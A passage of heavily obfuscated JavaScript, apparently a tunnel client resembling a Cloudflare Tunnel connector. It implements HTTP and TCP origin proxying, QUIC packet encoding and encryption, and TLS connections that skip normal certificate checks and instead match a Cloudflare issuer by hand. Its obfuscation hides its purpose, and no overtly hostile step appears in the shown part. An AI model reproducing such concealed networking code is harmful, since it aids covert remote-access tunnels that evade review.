            case '0':
                this[il(0x6d3)] = c;
                continue;
            case '1':
                this[il(0xd12)] = a;
                continue;
            case '2':
                this[il(0xe6f)] = d[il(0xd75)] === !![];
                continue;
            case '3':
                this[il(0xb8e)] = Buffer[il(0xacf)](0x0);
                continue;
            case '4':
                this[il(0xc97)] = b;
                continue;
            case '5':
                this[il(0x591)] = ![];
                continue;
            }
            break;
        }
    }
    ['start'](a, b, c, d) {
        const im = a0d0;
        this['connection'][im(0xc90)](this[im(0xc97)], a0b8(0x0), ![]), this['connection'][im(0xc90)](this[im(0xc97)], a0b9(0x1, 0x0, a, b, c, d), ![]);
    }
    [a0d0(0x753)](a) {
        const io = a0d0, b = {
                'QRvQy': function (f, g) {
                    return f(g);
                },
                'Ljchi': function (f, g) {
                    return f + g;
                },
                'pJmJH': io(0x97d),
                'WsUMN': 'unknown',
                'waGJT': function (f, g) {
                    return f + g;
                },
                'BDZFR': io(0x978),
                'ZzUFm': io(0xd83)
            };
        this[io(0xb8e)] = this['buffer']['length'] ? Buffer['concat']([
            this[io(0xb8e)],
            a
        ]) : a;
        let c, d;
        [c, d] = b[io(0x347)](a0ba, this['buffer']), this[io(0xb8e)] = d;
        for (const f of c) {
            try {
                const g = b[io(0x347)](a0bf, f);
                if (g['bootstrap'])
                    continue;
                g['ok'] ? (this[io(0x6d3)][io(0x6e3)](b['Ljchi'](b[io(0x37c)], g[io(0xca9)] || b['WsUMN'])), this['connection'][io(0x175)] = !![]) : (this[io(0x6d3)][io(0xd62)](b['waGJT'](b['BDZFR'], g[io(0x755)] || b[io(0x39f)])), this[io(0xd12)]['registrationFailed'] = !![], this[io(0xd12)][io(0x240)] = !![]);
            } catch (h) {
                this[io(0x6d3)][io(0xb89)](io(0x6c5) + h);
            }
        }
    }
}
function a0bs(a) {
    const ip = a0d0, b = {
            'YJVnr': ip(0x476),
            'RYbRG': function (c, d) {
                return c(d);
            },
            'NlAnu': function (c, d, f) {
                return c(d, f);
            },
            'iVEaX': function (c, d, f) {
                return c(d, f);
            },
            'ggqRS': function (c, d) {
                return c(d);
            },
            'SPrgo': ip(0xb4),
            'ENjyd': ip(0xdd1),
            'dSPBk': function (c, d) {
                return c === d;
            },
            'tEWUg': ip(0xbc7),
            'xZaQJ': 'connect'
        };
    return new Promise((c, d) => {
        const iq = ip;
        let f;
        try {
            f = new URL(a);
        } catch (m) {
            b['ggqRS'](d, new Error(b[iq(0x1d7)]));
            return;
        }
        if (![
                b['ENjyd'],
                iq(0xbc7)
            ]['includes'](f[iq(0xcf9)]) || !f[iq(0x1de)]) {
            b[iq(0xa9d)](d, new Error(b['SPrgo']));
            return;
        }
        const g = b[iq(0x939)](f[iq(0xcf9)], b[iq(0x2f9)]), h = f[iq(0x606)] || (g ? 0x1bb : 0x50), i = a0i[iq(0xdf8)]({
                'host': f['hostname'],
                'port': h
            });
        let j = ![];
        const k = (n, o) => {
                const ir = iq, p = b[ir(0x21b)][ir(0xc0)]('|');
                let q = 0x0;
                while (!![]) {
                    switch (p[q++]) {
                    case '0':
                        i[ir(0xdb6)](0x0);
                        continue;
                    case '1':
                        if (j)
                            return;
                        continue;
                    case '2':
                        i[ir(0x503)](ir(0x755), l);
                        continue;
                    case '3':
                        b['RYbRG'](n, o);
                        continue;
                    case '4':
                        j = !![];
                        continue;
                    }
                    break;
                }
            }, l = n => {
                const is = iq;
                !j && b[is(0x88f)](k, d, n);
            };
        i['on'](iq(0x755), l), i[iq(0xdb6)](0x7530, () => i[iq(0x4d7)](new Error('origin\x20connection\x20timeout'))), i['on'](b[iq(0xd25)], () => {
            const it = iq;
            if (!g) {
                b['iVEaX'](k, c, i);
                return;
            }
            const n = a0j['connect']({
                'socket': i,
                'servername': f[it(0x1de)]
            });
            n['on'](it(0x755), o => {
                !j && k(d, o);
            }), n['on']('secureConnect', () => {
                k(c, n);
            });
        });
    });
}
function a0bt(a) {
    const iu = a0d0, b = {
            'sbXQg': function (d, f) {
                return d < f;
            },
            'PCYdm': function (d, f) {
                return d + f;
            }
        }, c = [];
    for (let d = 0x0; b[iu(0x86b)](d, a['rawHeaders'][iu(0x615)]); d += 0x2) {
        c[iu(0x59a)]([
            a[iu(0x4fd)][d],
            a[iu(0x4fd)][b[iu(0x86c)](d, 0x1)]
        ]);
    }
    return c;
}
function a0bu(a, b, c, d, f) {
    const iv = a0d0, g = {
            'FNugH': function (h, i) {
                return h(i);
            },
            'PIxGF': iv(0xb4),
            'zUbdC': iv(0xdd1),
            'ksIVu': iv(0xbc7),
            'pgPdC': function (h, i) {
                return h(i);
            },
            'tntJX': function (h, i) {
                return h === i;
            },
            'zAOQM': 'host',
            'Kszns': iv(0xd12),
            'noKeb': 'transfer-encoding',
            'uzKJR': 'content-length',
            'njwdM': 'Content-Length',
            'yTQpZ': 'error'
        };
    return new Promise((h, i) => {
        const iw = iv, j = {
                'vMCYh': function (r, s) {
                    return r(s);
                }
            };
        let k;
        try {
            k = new URL(a);
        } catch (r) {
            g['FNugH'](i, new Error(g[iw(0x7a5)]));
            return;
        }
        if (![
                g[iw(0x7cb)],
                g[iw(0x36b)]
            ][iw(0xd32)](k['protocol']) || !k[iw(0x1de)]) {
            g[iw(0x203)](i, new Error('origin\x20must\x20be\x20an\x20http://\x20or\x20https://\x20URL'));
            return;
        }
        const l = g[iw(0xc23)](k[iw(0xcf9)], g[iw(0x36b)]), m = k[iw(0x606)] || (l ? 0x1bb : 0x50), n = {};
        for (const [s, t] of d) {
            const u = s['toLowerCase']();
            if (u === g['zAOQM'] || u === g[iw(0x39d)] || u === g[iw(0x79b)] || u === g[iw(0x356)])
                continue;
            n[s] = t;
        }
        n[iw(0x295)] = k[iw(0xc32)];
        f[iw(0x615)] && (n[g['njwdM']] = String(f['length']));
        const o = c[iw(0x46a)]('/') ? c : '/' + c, p = l ? a0h : a0g, q = p[iw(0x6be)]({
                'hostname': k[iw(0x1de)],
                'port': m,
                'path': o,
                'method': b,
                'headers': n,
                'timeout': 0x7530
            }, v => {
                const ix = iw;
                j[ix(0x526)](h, {
                    'status': v[ix(0x12e)],
                    'headers': j[ix(0x526)](a0bt, v),
                    'body': v
                });
            });
        q['on'](g[iw(0x7a6)], v => i(v)), q['end'](f['length'] ? f : undefined);
    });
}
function a0bv(a) {
    const iy = a0d0, b = {
            'TNFtg': iy(0x426),
            'LNAhz': iy(0x755),
            'XWDhV': 'close',
            'uHgmj': iy(0x874),
            'SzRTt': function (c, d) {
                return c < d;
            },
            'uMhFS': function (c) {
                return c();
            },
            'PBQsb': iy(0x80e),
            'gXrRy': function (c, d, f) {
                return c(d, f);
            },
            'AZCBy': 'malformed\x20HTTP/1.1\x20response\x20status',
            'pArXl': function (c, d) {
                return c < d;
            },
            'nxByT': function (c, d) {
                return c + d;
            },
            'WoUQQ': iy(0x898),
            'eZfGG': iy(0x65c)
        };
    return new Promise((c, d) => {
        const iz = iy, f = {
                'OCqoY': function (l, m) {
                    return l(m);
                },
                'GoRkl': b[iz(0xb80)]
            };
        let g = Buffer[iz(0xacf)](0x0);
        const h = () => {
                const iA = iz;
                a[iA(0x503)](b[iA(0xb6d)], i), a[iA(0x503)](b[iA(0xbc4)], j), a[iA(0x503)](iA(0x65c), k), a['removeListener'](b[iA(0x6d7)], k);
            }, i = l => {
                const iB = iz;
                g = g['length'] ? Buffer['concat']([
                    g,
                    l
                ]) : l;
                const m = g[iB(0x44f)](b[iB(0x757)]);
                if (b[iB(0x9cf)](m, 0x0))
                    return;
                b['uMhFS'](h);
                const n = g[iB(0x3d1)](0x0, m)[iB(0xa27)](b[iB(0x8b0)]), o = n[iB(0xc0)]('\x0d\x0a'), p = o[0x0][iB(0xc0)]('\x20'), q = b['gXrRy'](parseInt, p[0x1], 0xa);
                if (!Number[iB(0x3f2)](q)) {
                    d(new Error(b['AZCBy']));
                    return;
                }
                const r = [];
                for (let s = 0x1; b['pArXl'](s, o[iB(0x615)]); s++) {
                    const t = o[s];
                    if (!t)
                        continue;
                    const u = t['indexOf'](':');
                    u > 0x0 && r[iB(0x59a)]([
                        t[iB(0x174)](0x0, u)[iB(0x27f)](),
                        t[iB(0x174)](u + 0x1)[iB(0x27f)]()
                    ]);
                }
                c({
                    'status': q,
                    'headers': r,
                    'rest': g['subarray'](b[iB(0x3e7)](m, 0x4))
                });
            }, j = l => {
                h(), d(l);
            }, k = () => {
                const iC = iz;
                h(), f[iC(0x7ff)](d, new Error(f[iC(0xd0e)]));
            };
        a['on'](b[iz(0xb6d)], i), a['on'](b[iz(0xbc4)], j), a['on'](b[iz(0xe0a)], k), a['on'](b[iz(0x6d7)], k);
    });
}
function a0bw(a) {
    const iD = a0d0, b = {
            'DfVmQ': function (f, g) {
                return f === g;
            },
            'HLsUf': iD(0xde1),
            'YRriO': iD(0x8ab),
            'tPfqS': iD(0xdfc),
            'Hattg': function (f, g) {
                return f !== g;
            },
            'DNvXQ': function (f, g) {
                return f + g;
            },
            'pKPtw': iD(0x89a),
            'XibPO': function (f, g) {
                return f(g);
            },
            'rYKcp': iD(0x3ad),
            'wCUsO': function (f, g) {
                return f !== g;
            },
            'OcqYO': iD(0xeb2),
            'dwwji': iD(0x227),
            'VTpeJ': iD(0x9f1)
        };
    if (!a || !a[iD(0x3e5)])
        return b[iD(0x1c4)];
    if (b[iD(0xd1f)](a[iD(0x3e5)]['O'], 'CloudFlare,\x20Inc.'))
        return b['DNvXQ'](b[iD(0x504)], a[iD(0x3e5)]['O'] || '');
    if (!b[iD(0x8ec)](String, a[iD(0x3e5)]['OU'] || '')['startsWith'](b[iD(0xd27)]))
        return b[iD(0x66c)]('issuer\x20OU\x20mismatch:\x20', a[iD(0x3e5)]['OU'] || '');
    if (!a['subject'] || b['wCUsO'](a[iD(0x933)]['CN'], b[iD(0xe72)]))
        return b[iD(0x6cf)];
    const c = String(a[iD(0xa3b)] || '')[iD(0xc0)](',')['map'](f => f['trim']()[iD(0x777)]()), d = c['some'](f => {
            const iE = iD;
            if (!f['startsWith'](iE(0xab0)))
                return ![];
            const g = f[iE(0x174)](0x4);
            return b[iE(0xd64)](g, b[iE(0x8f4)]) || b[iE(0xd64)](g, b[iE(0x7a2)]) || g[iE(0x46a)]('*.') && b[iE(0x8f4)][iE(0x361)](g['slice'](0x1));
        });
    if (!d)
        return b[iD(0x519)];
    return null;
}
function a0bx(a, b) {
    const iF = a0d0, c = {
            'JVfrE': function (h, i) {
                return h(i);
            },
            'Ogoff': function (h, i) {
                return h + i;
            },
            'EpPkb': iF(0xad0),
            'TybYy': function (h, i) {
                return h !== i;
            },
            'kAeqb': iF(0x48d),
            'apstM': function (h, i) {
                return h > i;
            },
            'BDRMR': function (h, i) {
                return h + i;
            },
            'ExxfS': iF(0x783),
            'FZMdr': function (h, i) {
                return h(i);
            },
            'gNaGy': 'error',
            'CKBhw': iF(0x623),
            'IYJkp': function (h, i) {
                return h + i;
            },
            'CqcmQ': function (h, i) {
                return h + i;
            },
            'icpsC': iF(0x87c),
            'uQTRb': iF(0x670),
            'TCOnn': function (h, i) {
                return h + i;
            },
            'gibuY': iF(0x9e3)
        }, d = a0aQ[iF(0x174)]()['sort'](() => Math[iF(0xdd7)]() - 0.5);
    let f = null;
    const g = async () => {
        const iM = iF;
        for (const h of d) {
            try {
                return await new Promise((i, j) => {
                    const iJ = a0b, k = {
                            'ZbBlA': function (m, n) {
                                const iG = a0b;
                                return c[iG(0x998)](m, n);
                            },
                            'erSXv': function (m, n) {
                                const iH = a0b;
                                return c[iH(0x7e8)](m, n);
                            },
                            'MTpvD': c['EpPkb'],
                            'rrGhI': function (m, n) {
                                const iI = a0b;
                                return c[iI(0xa3e)](m, n);
                            },
                            'JvPwP': c[iJ(0xe05)],
                            'TTUVt': function (m, n) {
                                return c['apstM'](m, n);
                            },
                            'pWENz': function (m, n) {
                                return c['BDRMR'](m, n);
                            },
                            'uBKWt': c[iJ(0xd40)],
                            'kSzXR': function (m, n) {
                                const iK = iJ;
                                return c[iK(0x1a5)](m, n);
                            }
                        }, l = a0j['connect']({
                            'host': h,
                            'port': a0aR,
                            'ALPNProtocols': ['h2'],
                            'servername': iJ(0xde1),
                            'rejectUnauthorized': ![]
                        });
                    l['setTimeout'](0x2710, () => l[iJ(0x4d7)](new Error(iJ(0x9ac)))), l['on'](c[iJ(0x1b6)], j), l['on'](c[iJ(0x5d2)], () => {
                        const iL = iJ;
                        if (a) {
                            const n = k[iL(0xaba)](a0bw, l[iL(0xaf0)](![]));
                            if (n) {
                                l['destroy'](new Error(k['erSXv'](k['MTpvD'], n)));
                                return;
                            }
                        }
                        const m = l[iL(0xc1c)];
                        if (m && k[iL(0xee7)](m, 'h2')) {
                            l[iL(0x4d7)](new Error(k['JvPwP']));
                            return;
                        }
                        k[iL(0xc6a)](a0cD, 0x0) ? l[iL(0xdb6)](a0cD, () => l[iL(0x4d7)](new Error(iL(0xec2)))) : l[iL(0xdb6)](0x0), b[iL(0x6e3)](k[iL(0x9d7)](k['pWENz'](k[iL(0xb77)], h) + ':', a0aR)), k[iL(0xddd)](i, l);
                    });
                });
            } catch (i) {
                f = i, b[iM(0xd62)](c[iM(0x2fb)](c['CqcmQ'](c['icpsC'], h) + c[iM(0xb85)], i));
            }
        }
        throw new Error(c['TCOnn'](c[iM(0x472)], f));
    };
    return g();
}
const a0by = Buffer[a0d0(0x58d)](a0d0(0x7dc), 'hex'), a0bz = Buffer['from'](a0d0(0x316), 'hex'), a0bA = Buffer['concat']([
        a0by,
        Buffer['from']('01', 'latin1')
    ]), a0bB = Buffer['concat']([
        a0bz,
        Buffer[a0d0(0x58d)]('01', a0d0(0x80e))
    ]), a0bC = {
        'http': 0x0,
        'websocket': 0x1,
        'tcp': 0x2
    }, a0bD = a0d0(0x72f), a0bE = a0d0(0x5cb), a0bF = a0d0(0x1eb), a0bG = a0d0(0xe07), a0bH = 0x1, a0bI = a0d0(0x27b), a0bJ = a0d0(0x62f), a0bK = Buffer[a0d0(0x58d)](a0d0(0x89c), a0d0(0xaef)), a0bL = Buffer[a0d0(0x58d)]('cf21ad74e59a6111be1d8c021e65b891c2a211167abb8c5e079e09e2c8a8339c', a0d0(0xaef)), a0bM = 0x10, a0bN = 0x4, a0bO = 0x4d0, a0bP = 0x4b0, a0bQ = 0x0, a0bR = 0x1, a0bS = 0x2, a0bT = [
        a0d0(0x3c7),
        'handshake',
        a0d0(0xc24)
    ], a0bU = {
        'padding': 0x0,
        'ping': 0x1,
        'ack': 0x2,
        'ackEcn': 0x3,
        'resetStream': 0x4,
        'stopSending': 0x5,
        'crypto': 0x6,
        'newToken': 0x7,
        'stream': 0x8,
        'maxData': 0x10,
        'maxStreamData': 0x11,
        'maxStreamsBidi': 0x12,
        'maxStreamsUni': 0x13,
        'newConnectionId': 0x18,
        'retireConnectionId': 0x19,
        'pathChallenge': 0x1a,
        'pathResponse': 0x1b,
        'transportClose': 0x1c,
        'applicationClose': 0x1d,
        'handshakeDone': 0x1e,
        'datagram': 0x30,
        'datagramLen': 0x31
    }, a0bV = {
        'originalDestinationConnectionId': 0x0,
        'maxIdleTimeout': 0x1,
        'statelessResetToken': 0x2,
        'maxUdpPayloadSize': 0x3,
        'initialMaxData': 0x4,
        'initialMaxStreamDataBidiLocal': 0x5,
        'initialMaxStreamDataBidiRemote': 0x6,
        'initialMaxStreamDataUni': 0x7,
        'initialMaxStreamsBidi': 0x8,
        'initialMaxStreamsUni': 0x9,
        'ackDelayExponent': 0xa,
        'maxAckDelay': 0xb,
        'disableActiveMigration': 0xc,
        'activeConnectionIdLimit': 0xe,
        'initialSourceConnectionId': 0xf,
        'retrySourceConnectionId': 0x10,
        'maxDatagramFrameSize': 0x20
    };
function a0bW(a) {
    const iN = a0d0, b = {
            'BWquD': function (d, f) {
                return d(f);
            },
            'ftCgr': function (d, f) {
                return d < f;
            },
            'dLgdJ': function (d, f) {
                return d < f;
            }
        }, c = b[iN(0xd31)](BigInt, a);
    if (b[iN(0xb70)](c, 0x40n))
        return 0x1;
    if (b['ftCgr'](c, 0x4000n))
        return 0x2;
    if (b[iN(0xd7e)](c, 0x40000000n))
        return 0x4;
    return 0x8;
}
function a0bX(a) {
    const iO = a0d0, b = {
            'gAbiJ': function (j, k) {
                return j < k;
            },
            'RhcFr': function (j, k) {
                return j - k;
            },
            'FXmnh': function (j, k) {
                return j > k;
            },
            'JPOkO': function (j, k) {
                return j(k);
            },
            'AeeeU': function (j, k) {
                return j | k;
            },
            'RMupt': function (j, k) {
                return j(k);
            }
        }, c = BigInt(a);
    let d, f, g;
    if (b[iO(0x5a4)](c, 0x40n))
        f = 0x1, g = 0x0;
    else {
        if (b[iO(0x5a4)](c, 0x4000n))
            f = 0x2, g = 0x40;
        else
            b[iO(0x5a4)](c, 0x40000000n) ? (f = 0x4, g = 0x80) : (f = 0x8, g = 0xc0);
    }
    d = Buffer[iO(0xacf)](f);
    let h = c;
    for (let j = b[iO(0x152)](f, 0x1); b['FXmnh'](j, 0x0); j--) {
        d[j] = b[iO(0x9a9)](Number, h & 0xffn), h >>= 0x8n;
    }
    return d[0x0] = b[iO(0xce9)](b[iO(0xa9b)](Number, h), g), d;
}
function a0bY(a, b) {
    const iP = a0d0, c = {
            'eqkDw': function (h, j) {
                return h - j;
            },
            'cXqOJ': function (h, j) {
                return h << j;
            },
            'MhwKi': function (h, j) {
                return h >> j;
            },
            'QvSQw': function (h, j) {
                return h < j;
            },
            'SeEfh': function (h, j) {
                return h(j);
            },
            'YOuuk': function (h, j) {
                return h & j;
            },
            'BDnuR': function (h, j) {
                return h | j;
            },
            'gadsb': function (h, j) {
                return h + j;
            }
        };
    if (c['eqkDw'](a['length'], b) < 0x1)
        return null;
    const d = a[b], f = c['cXqOJ'](0x1, c[iP(0xdab)](d, 0x6));
    if (c[iP(0x5c9)](c['eqkDw'](a[iP(0x615)], b), f))
        return null;
    let g = c[iP(0x10f)](BigInt, c[iP(0x4f7)](d, 0x3f));
    for (let h = 0x1; c[iP(0x5c9)](h, f); h++) {
        g = c[iP(0x5c5)](g << 0x8n, c[iP(0x10f)](BigInt, a[c['gadsb'](b, h)]));
    }
    return [
        g,
        f
    ];
}
class a0bZ {
    constructor() {
        const iQ = a0d0;
        this[iQ(0x93f)] = [];
    }
    [a0d0(0xc43)](a) {
        const iR = a0d0, b = {
                'ZzZJu': function (c, d) {
                    return c & d;
                }
            };
        return this[iR(0x93f)][iR(0x59a)](Buffer['from']([b[iR(0x5da)](a, 0xff)])), this;
    }
    [a0d0(0xf2c)](a) {
        const iS = a0d0;
        return this['parts'][iS(0x59a)](Buffer[iS(0x55b)](a) ? a : Buffer[iS(0x58d)](a)), this;
    }
    [a0d0(0x184)](a, b) {
        const iT = a0d0, c = {
                'yxjwO': function (f, g) {
                    return f - g;
                },
                'vLfDl': function (f, g) {
                    return f >= g;
                },
                'SPWDx': function (f, g) {
                    return f(g);
                },
                'IlDDT': function (f, g) {
                    return f & g;
                }
            }, d = Buffer[iT(0xacf)](b);
        for (let f = c[iT(0xc7f)](b, 0x1); c['vLfDl'](f, 0x0); f--) {
            d[f] = c['SPWDx'](Number, c[iT(0xc6b)](a, 0xffn)), a >>= 0x8n;
        }
        return this[iT(0x93f)]['push'](d), this;
    }
    ['u8'](a) {
        const iU = a0d0, b = {
                'VlEjP': function (c, d) {
                    return c & d;
                }
            };
        return this['parts'][iU(0x59a)](Buffer[iU(0x58d)]([b[iU(0xf2b)](a, 0xff)])), this;
    }
    [a0d0(0xe5f)](a) {
        const iV = a0d0, b = Buffer[iV(0xacf)](0x2);
        return b['writeUInt16BE'](a & 0xffff, 0x0), this[iV(0x93f)][iV(0x59a)](b), this;
    }
    ['u32'](a) {
        const iW = a0d0, b = {
                'vGOhY': function (d, f) {
                    return d >>> f;
                }
            }, c = Buffer[iW(0xacf)](0x4);
        return c[iW(0x16d)](b[iW(0x861)](a, 0x0), 0x0), this['parts'][iW(0x59a)](c), this;
    }
    [a0d0(0xb61)](a) {
        const iX = a0d0, b = {
                'lAfnC': function (c, d) {
                    return c(d);
                }
            };
        return this['parts'][iX(0x59a)](b[iX(0x425)](a0bX, a)), this;
    }
    [a0d0(0x796)]() {
        const iY = a0d0;
        return Buffer[iY(0x7b6)](this[iY(0x93f)]);
    }
}
class a0c0 {
    constructor(a) {
        const iZ = a0d0;
        this['buffer'] = a, this[iZ(0x6f8)] = 0x0;
    }
    get [a0d0(0x68e)]() {
        const j0 = a0d0, a = {
                'gEaYt': function (b, c) {
                    return b - c;
                }
            };
        return a[j0(0x9b4)](this[j0(0xb8e)]['length'], this['pos']);
    }
    ['byte']() {
        const j1 = a0d0, a = this['buffer'][this[j1(0x6f8)]];
        return this[j1(0x6f8)] += 0x1, a;
    }
    [a0d0(0xe5f)]() {
        const j2 = a0d0, a = this[j2(0xb8e)][j2(0x93d)](this[j2(0x6f8)]);
        return this[j2(0x6f8)] += 0x2, a;
    }
    [a0d0(0x34c)]() {
        const j3 = a0d0, a = this[j3(0xb8e)][j3(0xd7)](this[j3(0x6f8)], 0x3);
        return this[j3(0x6f8)] += 0x3, a;
    }
    [a0d0(0x22a)]() {
        const j4 = a0d0, a = this[j4(0xb8e)][j4(0x4d5)](this['pos']);
        return this[j4(0x6f8)] += 0x4, a;
    }
    [a0d0(0xf2c)](a) {
        const j5 = a0d0, b = this[j5(0xb8e)][j5(0x3d1)](this['pos'], this[j5(0x6f8)] + a);
        return this[j5(0x6f8)] += a, b;
    }
    [a0d0(0xb61)]() {
        const j6 = a0d0, a = {
                'ELwEK': function (c, d, f) {
                    return c(d, f);
                },
                'zknxI': function (c, d) {
                    return c === d;
                },
                'WDYUp': 'truncated\x20QUIC\x20varint'
            }, b = a['ELwEK'](a0bY, this['buffer'], this[j6(0x6f8)]);
        if (a[j6(0xa54)](b, null))
            throw new Error(a[j6(0x17f)]);
        return this['pos'] += b[0x1], b[0x0];
    }
    ['number']() {
        const j7 = a0d0, a = {
                'mcpxv': function (c, d) {
                    return c > d;
                },
                'EiTNV': function (c, d) {
                    return c(d);
                },
                'SwSww': function (c, d) {
                    return c(d);
                }
            }, b = this[j7(0xb61)]();
        if (a[j7(0x989)](b, a[j7(0xb92)](BigInt, Number[j7(0x6df)])))
            return Number[j7(0x6df)];
        return a[j7(0x226)](Number, b);
    }
}
function a0c1(a, b, c) {
    const j8 = a0d0;
    return a0k[j8(0xd10)](a, b)['update'](c)[j8(0x40b)]();
}
function a0c2(a, b, c, d) {
    const j9 = a0d0, f = {
            'MxzLN': function (j, k) {
                return j < k;
            }
        }, g = [];
    let h = Buffer['alloc'](0x0), i = 0x1;
    while (f[j9(0xae3)](g[j9(0xea6)]((j, k) => j + k[j9(0x615)], 0x0), d)) {
        h = a0k[j9(0xd10)](a, b)[j9(0xaf5)](Buffer['concat']([
            h,
            c,
            Buffer['from']([i])
        ]))[j9(0x40b)](), g['push'](h), i++;
    }
    return Buffer[j9(0x7b6)](g)[j9(0x3d1)](0x0, d);
}
function a0c3(a, b, c, d, f) {
    const ja = a0d0, g = {
            'zOJaO': ja(0x447),
            'Ekldf': ja(0x132),
            'YkqfQ': function (k, l) {
                return k & l;
            },
            'OTEFI': function (k, l) {
                return k >> l;
            },
            'LPOKz': function (k, l) {
                return k & l;
            },
            'ySqgC': function (k, l, m, n, o) {
                return k(l, m, n, o);
            }
        }, h = Buffer['concat']([
            Buffer['from'](g[ja(0x166)], g[ja(0x32a)]),
            Buffer[ja(0x58d)](c, g[ja(0x32a)])
        ]), i = d || Buffer['alloc'](0x0), j = Buffer[ja(0x7b6)]([
            Buffer[ja(0x58d)]([
                g[ja(0xc9e)](g[ja(0x454)](f, 0x8), 0xff),
                g[ja(0xf06)](f, 0xff)
            ]),
            Buffer[ja(0x58d)]([h[ja(0x615)]]),
            h,
            Buffer[ja(0x58d)]([i[ja(0x615)]]),
            i
        ]);
    return g[ja(0x8b3)](a0c2, a, b, j, f);
}
class a0c4 {
    constructor(a, b, c) {
        const jb = a0d0, d = {
                'uRRMr': function (g, h, i, j, k, l) {
                    return g(h, i, j, k, l);
                },
                'eIKfM': jb(0xd4b),
                'uTnfn': function (g, h, i, j, k, l) {
                    return g(h, i, j, k, l);
                },
                'GrgqG': jb(0xc4),
                'dMlHf': 'quic\x20hp',
                'rtSrP': jb(0x47c),
                'ULnUY': jb(0x76c)
            };
        this[jb(0x678)] = a, this[jb(0x4a5)] = b, this[jb(0x1cb)] = c;
        const f = b === jb(0xb0) ? 0x20 : 0x10;
        this['key'] = d[jb(0xd0)](a0c3, a, c, d[jb(0xee3)], Buffer['alloc'](0x0), f), this['iv'] = d[jb(0x73d)](a0c3, a, c, d[jb(0xcfa)], Buffer[jb(0xacf)](0x0), 0xc), this[jb(0x423)] = d[jb(0xd0)](a0c3, a, c, d[jb(0xb16)], Buffer[jb(0xacf)](0x0), f), this[jb(0x6ed)] = f === 0x20 ? d[jb(0x4aa)] : d[jb(0x23a)], this[jb(0xf16)] = 0x10;
    }
    ['nonce'](a) {
        const jc = a0d0, b = {
                'srwRN': function (f, g) {
                    return f(g);
                },
                'zjsMS': function (f, g) {
                    return f & g;
                }
            }, c = Buffer[jc(0x58d)](this['iv']);
        let d = b['srwRN'](BigInt, a);
        for (let f = 0x0; f < 0x8; f++) {
            c[0xb - f] ^= b[jc(0xc77)](Number, b['zjsMS'](d, 0xffn)), d >>= 0x8n;
        }
        return c;
    }
    [a0d0(0xf1d)](a) {
        const jd = a0d0, b = a0k[jd(0xa1c)](this['hpCipher'], this[jd(0x423)], null);
        return b[jd(0x961)](![]), Buffer[jd(0x7b6)]([
            b[jd(0xaf5)](a),
            b[jd(0xd42)]()
        ])[jd(0x3d1)](0x0, 0x5);
    }
    ['seal'](a, b, c) {
        const je = a0d0, d = a0k[je(0xa1c)](this[je(0x4a5)], this[je(0xd79)], this['nonce'](a));
        d['setAAD'](b);
        const f = Buffer[je(0x7b6)]([
                d[je(0xaf5)](c),
                d[je(0xd42)]()
            ]), g = d['getAuthTag']();
        return Buffer[je(0x7b6)]([
            f,
            g
        ]);
    }
    ['open'](a, b, c) {
        const jf = a0d0, d = {
                'CZlLk': function (g, h) {
                    return g - h;
                },
                'ExIOi': function (g, h) {
                    return g - h;
                }
            }, f = a0k[jf(0x75c)](this['cipher'], this[jf(0xd79)], this[jf(0xd8)](a));
        return f[jf(0x10a)](b), f[jf(0xb21)](c['subarray'](d['CZlLk'](c[jf(0x615)], this['tagSize']))), Buffer['concat']([
            f[jf(0xaf5)](c[jf(0x3d1)](0x0, d[jf(0x79e)](c[jf(0x615)], this[jf(0xf16)]))),
            f['final']()
        ]);
    }
}
function a0c5(a, b) {
    const jg = a0d0, c = {
            'dQnxT': function (f, g, h, i, j, k) {
                return f(g, h, i, j, k);
            },
            'SIrIY': 'quic\x20ku'
        }, d = new a0c4(a[jg(0x678)], a[jg(0x4a5)], c[jg(0x448)](a0c3, a[jg(0x678)], a[jg(0x1cb)], c[jg(0x24c)], Buffer[jg(0xacf)](0x0), a[jg(0x1cb)][jg(0x615)]));
    return b && (d[jg(0x423)] = a[jg(0x423)]), d;
}
function a0c6(a, b) {
    const jh = a0d0, c = {
            'ALWBC': 'sha256',
            'yjzBW': function (i, j, k, l) {
                return i(j, k, l);
            },
            'rIyNP': jh(0x7c5),
            'hhHsF': jh(0xb84),
            'flpaM': function (i, j, k, l, m, n) {
                return i(j, k, l, m, n);
            }
        }, d = c[jh(0xab7)], f = c[jh(0x4f5)](a0c1, d, a0bK, a), g = b ? jh(0x996) : c['rIyNP'], h = b ? c[jh(0x7e4)] : jh(0x996);
    return {
        'send': new a0c4(d, c[jh(0x4e2)], c[jh(0x62c)](a0c3, d, f, g, Buffer[jh(0xacf)](0x0), 0x20)),
        'recv': new a0c4(d, c[jh(0x4e2)], a0c3(d, f, h, Buffer[jh(0xacf)](0x0), 0x20))
    };
}
function a0c7(a, b, c) {
    const ji = a0d0, d = {
            'ICona': function (g, h) {
                return g + h;
            },
            'oCVbl': function (g, h) {
                return g <= h;
            },
            'sdYBy': function (g, h) {
                return g >= h;
            },
            'swhNB': function (g, h) {
                return g < h;
            },
            'OVIKO': function (g, h) {
                return g - h;
            },
            'gpGwO': function (g, h) {
                return g > h;
            }
        }, f = [];
    for (const g of a) {
        const h = g[ji(0xb58)], i = d[ji(0x3fb)](g[ji(0xb58)], g[ji(0x615)]);
        if (d[ji(0x202)](i, b) || d[ji(0x601)](h, c)) {
            f[ji(0x59a)](g);
            continue;
        }
        d[ji(0xd3d)](h, b) && f[ji(0x59a)]({
            'start': h,
            'length': d[ji(0xcc4)](b, h)
        }), d[ji(0xe0)](i, c) && f[ji(0x59a)]({
            'start': c,
            'length': d[ji(0xcc4)](i, c)
        });
    }
    return f;
}
function a0c8(c, d) {
    const jj = a0d0, f = {
            'rlHPN': function (i, j) {
                return i + j;
            },
            'RiMyl': function (i, j) {
                return i - j;
            }
        }, g = c[jj(0x7b6)](d)['sort']((i, j) => i[jj(0xb58)] - j[jj(0xb58)]), h = [];
    for (const i of g) {
        const j = h[jj(0x615)] ? h[h[jj(0x615)] - 0x1] : null, k = f[jj(0xe58)](i[jj(0xb58)], i[jj(0x615)]);
        j && i[jj(0xb58)] <= j['start'] + j['length'] ? j[jj(0x615)] = Math['max'](j[jj(0x615)], f[jj(0x3de)](k, j[jj(0xb58)])) : h[jj(0x59a)]({
            'start': i[jj(0xb58)],
            'length': i[jj(0x615)]
        });
    }
    return h;
}
class a0c9 {
    constructor(a) {
        const jk = a0d0, b = { 'rGmXZ': jk(0x70b) }, c = b['rGmXZ'][jk(0xc0)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[jk(0xd37)] = [];
                continue;
            case '1':
                this[jk(0x339)] = [];
                continue;
            case '2':
